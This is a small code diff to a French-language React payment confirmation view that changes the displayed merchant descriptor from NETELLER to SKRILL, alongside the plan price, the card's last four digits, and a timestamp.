@@ -266,7 +266,7 @@ const Board = () => {
             ) : (
               <>
                 <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')}</p>
-                <span>NETELLER* Essai Freelance</span>
+                <span>SKRILL* Essai Freelance</span>
                 <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                 <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>
 
